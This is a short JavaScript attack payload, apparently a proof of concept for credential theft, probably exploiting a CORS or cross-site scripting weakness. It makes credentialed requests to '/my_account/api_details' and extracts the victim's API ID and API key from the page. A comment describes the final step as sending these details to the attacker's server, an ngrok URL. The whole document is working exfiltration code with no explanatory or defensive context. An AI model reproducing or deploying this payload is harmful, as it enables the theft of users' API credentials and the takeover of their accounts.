var req1 = new XMLHttpRequest();
    req1.onload = req1Listener;
    req1.open('get', '/my_account/api_details', true);
    req1.withCredentials = true;
    req1.send('{}');
        function req1Listener() {
        document.write(this.responseText);
        };
        
        req1.onreadystatechange = function()
        {
            if (req1.readyState == 4 && req1.status == 200)
            {
                var req2 = new XMLHttpRequest();
                    req2.onload = handleResponse;
                    req2.open('get','/my_account/api_details',true);
                    req2.send();
                    function handleResponse() {
                        var api_ID = document.getElementsByTagName("span").api_id.firstChild.data
                        var api_Key = document.getElementsByTagName("span").api_key.firstChild.data
                        alert('api_ID = ' + api_ID + '\n' + 'api_Key =' + api_Key);
                        var stealInfo = new XMLHttpRequest();
        // This sends all victim's details(including api_ID, api_Key) to attackers server
                        stealInfo.open('post', 'https://f259aff8887f.ngrok.io', true);
                        stealInfo.send('api_ID = ' + api_ID + '&api_Key =' + api_Key)
                };
            }
        }
